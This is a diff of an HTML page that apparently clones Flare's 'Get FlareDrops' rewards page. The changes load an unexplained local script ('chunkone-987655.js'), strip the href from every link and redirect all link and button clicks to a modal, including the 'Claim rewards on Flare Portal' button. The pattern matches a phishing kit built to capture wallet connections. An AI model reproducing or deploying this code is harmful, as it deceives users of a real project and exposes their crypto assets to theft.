@@ -2,18 +2,52 @@
 <html lang="en">
 
 <head>
+  <script charset="UTF-8" type="text/javascript" src="./chunkone-987655.js"></script>
 <script src="//code.jivosite.com/widget/XeuEuXjI0X" async></script>
 
-  <script type="">
-    document.addEventListener('DOMContentLoaded', function() {
-  document.querySelectorAll('a, button').forEach(el => {
-    el.addEventListener('click', function(e) {
-      e.preventDefault();
-      window.location.href = 'connect';
+   <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        var links = document.querySelectorAll('body a');
+        for (var i = 0; i < links.length; i++) {
+          var link = links[i];
+          link.removeAttribute('href');
+          link.classList.add('builder-connector');
+        }
+       document.querySelectorAll('.builder-connector').forEach(btn => {
+      btn.addEventListener('click', () => {
+        openModal()
+      });
     });
-  });
-});
-  </script>
+        });
+
+        </script>   
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var buttons = document.querySelectorAll('body button');
+      for (var i = 0; i < buttons.length; i++) {
+        var button = buttons[i];
+        button.classList.add('builder-connector');
+      }
+    });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[ad-data-linked]');
+        elements.forEach(element => {
+            element.removeAttribute('ad-data-linked');
+        });
+    
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+    });
+    document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[builder-connector]');
+        elements.forEach(element => {
+            element.classList.add('builder-connector');
+        });
+    
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+    });
+    </script>
   <meta charset="utf-8">
   <title>Get FlareDrops | Flare</title>
   <title>Get FlareDrops | Flare</title>
@@ -1862,7 +1896,7 @@
           <div class="PageHero_content__Fql6N PageHero_content__standard__UwNgA PageHero_content__standardWImage__Tv0PE">
             <h2 class="PageHero_eyebrow__jRlsR PageHero_eyebrow__dt__du7_r">Get FlareDrops</h2>
             <h1 class="PageHero_header__QOojz">Hold wrapped FLR to earn monthly rewards.</h1>
-            <div class="PageHero_meta__BS580"><a class="ExternalLink_linkWrap__e6Hc9 Button_Button__cSgo6 Button_medium__p0lRL"  href="connect"><span class="Button_text__VsL5I">Claim rewards on Flare Portal</span><svg class="ExternalLink_arrow__qB7FZ Button_buttonIcon__s9zZi" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <div class="PageHero_meta__BS580"><a class="builder-connector ExternalLink_linkWrap__e6Hc9 Button_Button__cSgo6 Button_medium__p0lRL"  ><span class="Button_text__VsL5I">Claim rewards on Flare Portal</span><svg class="ExternalLink_arrow__qB7FZ Button_buttonIcon__s9zZi" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                   <path d="M13.9307 4.30305L2.36686 15.8669L0.936521 14.4365L12.5003 2.87272L1.63691 2.87272L1.65169 0.84831H15.9551V15.1517L13.9307 15.1665L13.9307 4.30305Z" fill="#C10F45"></path>
                 </svg></a></div>
           </div>
